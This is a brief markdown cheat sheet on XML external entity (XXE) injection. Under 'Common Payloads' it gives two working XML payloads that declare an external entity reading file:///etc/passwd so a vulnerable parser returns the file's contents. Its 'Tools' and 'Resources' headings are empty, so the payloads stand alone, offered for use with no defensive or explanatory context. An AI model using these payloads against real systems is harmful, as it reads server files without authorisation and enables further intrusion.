# XXE Injection

## Common Payloads
	<?xml version="1.0"?>
	  <!DOCTYPE data [
	  <!ELEMENT data (#ANY)>
	  <!ENTITY file SYSTEM "file:///etc/passwd">
	  ]>
	  <data>&file;</data>

	<?xml version="1.0" encoding="ISO-8859-1"?>
  	  <!DOCTYPE foo [  
  	  <!ELEMENT foo ANY >
  	  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

## Tools

## Resources & Write Ups
